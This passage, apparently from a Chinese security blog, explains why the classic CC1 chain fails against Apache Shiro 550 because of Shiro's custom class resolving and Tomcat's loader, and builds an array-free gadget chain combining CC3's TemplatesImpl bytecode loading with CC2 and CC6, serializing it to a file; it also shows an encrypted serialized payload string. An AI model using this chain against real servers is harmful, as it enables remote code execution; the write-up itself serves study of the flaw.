+<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GjDw1BVbSzeG2ZRTiqsafqN5Woprm2vK0ocyatebZYZCU5Wu30PTYzojzumFhnlTQ5GTyzlGh+Pm3PL5pBzTdQNVgwBoa7PqqUh9oqU2IIJymF2XMaQPVq513mugvjFZ8ZC2UoHDaFvlDRUToAtLqcJpfUoRq52Gvx8v1fB9GyJm5iZSLfXMmXDznYPVltvFvdePbi0eXj2K/85Zq89TCfsfVU5h2vAwP4XiTkZAlJgaXbR3FuFDpDZbKHaMRMdN5dCVT0nqHuCX/kIayuy7AfiMJRIt+sW0EFSX8S8T6Xcs/mCPtqvsiI0Kuxxl5oJq1fDRAf/QX8ovcUPiH0JK76llM+xtfkq4CrzoaY+NFp6lYOTXKN9PU+sjcioO/3BODMqmjg0clQHQV4ici3uIJ2C18V9AiZIK8S/NBhbi+0pjDECD5iErgGF5EGvdl4D85+R8GwxX8qwykGokzno6hwfyPMe9+UdvTn1rjsIroPjhETlyOZNzFlqu8Zj1K52JydgbceL1F35RjKWJzGc7dEBzmJmQ6Cahd6ICdgLRImlBYr62LZM18CXqB9naxJ4lbekq4R1zCQ8KKhpqWaAYXaL2jBsVympOss2I/uB4DQGYBVYBNowkwFlG3/O3zlDz+G60BVUR4cQnNwWqAnEWTSgS7ZGWaCfQW4T3gg4Gv5ZuuvEek9Kwi+h4e6bcrHEq6A+WTlrgb0XS40yQF2bwleEeNggdwpTrGbjd3pLUCa00Tn/yWLzzuN/6TwpANBHDfEB3RrPdaQSNu7YOGPSe4xEH3l+sSJMuULdwr/Two0TDOU1E/X9Y0wJ0crm0d7MIkvnHfqk6SGtyUTVYfo2c81sSWuB/6AQL0L9eYVozGWkl6h9Ap4lYckTuI5L1i7klVSSqcl++P0W26RrDTcVUs0YHTQc0KoPcrjrJm6jvJjz8RqiaClyrGIBL3kuSmmOWPZWT9V9CPhpz0n08i402ZdcVJOAhYAPk3B6P1t4ViPl0gcUP/hUt/acHMnhZGqNSRO5lgTambJg4d+bH9HUky19NXu3jb4jM9vauu6lqcmG87x97/uOA4EJRcGf2iFZO+6k96gRhUY/AJ0O5aE8veJhwnyPzaCaJzAdQlp4kQrWG0dvhKLhLHwdjOkrvBmERfxN58fpQDl82VHrV76+8jTIDFUZxzr/a/7IIqpmimcK9gsv7dBKP8nMRLoY64C0FR92FhRTcGcrGYc+NZpGK08aXZK1/eWqi9RgV2LY+lFn8f1Gl6QsIzy7H6zSw9GLq9r2EMR/DthiuPLBlOciFL50RVMit0Ts+wtSRmb3/3U97OP2zDEWeBNno0zRmCgrl0Mja1LbI1wtmYCFqHKbp1aRhCxKlHe94rkv8kpNpJwp3arAJckGZxRdhdr3MqL0JwQm0BOlfqyiGV4Z/LbczMIcut+OXRjma4nT8jIdFEwfVGc3a9OxU2x37F++ewCRl4jBr7+7N2f6KmN0JOLe21wsCm4pl0AKO6ZldfOeyZrQeo6SQ/44jxbQ/cg79vmV5&#39;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>回显发现报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210143247024.png" srcset="/img/loading.gif" lazyload alt="image-20251210143239920"></p>
+<p>别的类都能加载到，为什么无法加载Transformer？？</p>
+</li>
+</ul>
+<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><ul>
+<li><p>在反序列化这里不是用的原生的ObjectInputStream的readObject()</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210144233946.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>它是shiro里面自定义的对象输入流</p>
+</li>
+<li><p>步入<code>ClassResolvingObjectInputStream</code></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #C678DD">protected</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">resolveClass</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">ObjectStreamClass</span><span style="color: #E06C75"> osc) throws IOException</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> ClassNotFoundException {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">osc</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">UnknownClassException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ClassNotFoundException</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;Unable to load ObjectStreamClass [&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> osc </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;]: &quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> e)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p>这个类重写了<code>resolveClass</code>，所以在反序列化的时候就会<strong>优先</strong>调用这个重写的方法，从而走到<code>ClassResolvingObjectInputStream</code>类</p>
+<p><strong>（原生反序列化是一定会走resolveClass这个方法，但是重写之后就从重写的类走）</strong></p>
+<ul>
+<li><p>对比一下原生的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210145029408.png" srcset="/img/loading.gif" lazyload alt="image-20251210145029334"></p>
+<p>获取内容之后，类加载</p>
+</li>
+<li><p>重写的</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #C678DD">protected</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">resolveClass</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">ObjectStreamClass</span><span style="color: #E06C75"> osc) throws IOException</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> ClassNotFoundException {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">osc</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">UnknownClassException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ClassNotFoundException</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;Unable to load ObjectStreamClass [&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> osc </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;]: &quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> e)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p><code>ClassUtils</code>调用<code>forName</code></p>
+<p>（<code>ClassUtils</code>是<code>shiro</code>自己的工具类）</p>
+</li>
+<li><p>看看<code>ClassUtils</code>类的<code>forName</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210145630056.png" srcset="/img/loading.gif" lazyload alt="image-20251210145629972"></p>
+<p>他的意思就是说：要使用类加载器，依次加载（最多三次）</p>
+<p><code>ClassResolvingObjectInputStream</code>调用的是<code>ClassUtils.forName(osc.getName());</code>，其中<code>ClassUtils</code>是shiro自定的一个工具类</p>
+<p>而<code>ObjectInputStream</code>调用的是<code>Class.forName(name, false, latestUserDefinedLoader());</code></p>
+<p>我们可以这样理解：Class.forName是可以对数组进行操作的，而ClassUtils.forName是不能对数组进行操作的，这就是报错的原因</p>
+<p>主要问题就是：Classload的loadclass<strong>不能加载数组</strong>，forName<strong>可以加载数组</strong></p>
+<p><strong>也就是说，不出现数组类即可解决</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="为什么加载不了数组类"><a href="#为什么加载不了数组类" class="headerlink" title="为什么加载不了数组类"></a>为什么加载不了数组类</h4><p>主要出在<code>tomcat</code></p>
+<ul>
+<li><p><strong>接上面说到的ClassUtils.forName</strong></p>
+<p>由注释可知它是现有的类加载器，当前类的(即 <code>ClassUtils</code> 类)类加载器，一系统类加载器，加载jdk里面的，是加载不到CC依赖的</p>
+</li>
+<li><p>跟进<code>THREAD_CL_ACCESSOR</code>的<code>loadClass</code>方法</p>
+<p>发现是<code>WebappClassLoader</code>加载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210211605647.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+<li><p><code>WebappClassLoader</code>加载就是<code>tomcat</code>里面处理<code>web</code>程序的类加载器</p>
+<p>tomcat内部加载机制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210212046329.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>是从tomcat缓存里面找，jdk缓存里面找，然后直接EXT加载</p>
+<p>tomcat跳过App直接到EXT，<strong>不走双亲委派</strong>，再到bootstrap</p>
+</li>
+</ul>
+<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><blockquote>
+<p>不出现数组类</p>
+<p>所以我目前就是要通过cc链来整合一条不走transformer[  ]的链子</p>
+</blockquote>
+<p>这里我们不能利用数组了，因为cc1中调用Runtime.exec需要用<code>ChainedTransformer</code>和<code>ConstantTransformer</code>来更正返回值，所以我们选用动态类加载去加载恶意类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210150706083.png" srcset="/img/loading.gif" lazyload alt="image-20251210150705977"></p>
+<ul>
+<li><p>改写一下</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.ConstantTransformer</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.InvokerTransformer</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.map.LazyMap</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.*</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.nio.file.Files</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.nio.file.Paths</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.HashMap</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Map</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">shiro550cc</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchFieldException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//CC3</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">TemplatesImpl</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">templates</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">TemplatesImpl</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">TemplatesImpl</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">c1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">TemplatesImpl</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_name&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates,</span><span style="color: #98C379">&quot;aaa&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">tfactory</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_tfactory&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">tfactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">tfactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">TransformerFactoryImpl</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">bytecodes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_bytecodes&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">code</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Files</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readAllBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Paths</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;C://Users//95227//Desktop//实验室//其他//序列化//class//Test.class&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[][]codes</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">{code};</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates,codes);</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//CC2</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InvokerTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">invokerTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;newTransformer&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{});</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//CC6</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HashMap</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//这儿的map  key值为空</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">lazymap</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">  </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">TiedMapEntry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">tiedMapEntry</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">TiedMapEntry</span><span style="color: #ABB2BF">(lazymap,templates);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">map2</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HashMap</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">map2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(tiedMapEntry, </span><span style="color: #98C379">&quot;bbb&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">remove</span><span style="color: #ABB2BF">(templates);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">factory</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;factory&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">factory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">factory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(lazymap,invokerTransformer);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(map2);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//unserialize(&quot;ser.bin&quot;);</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">o</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(o);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
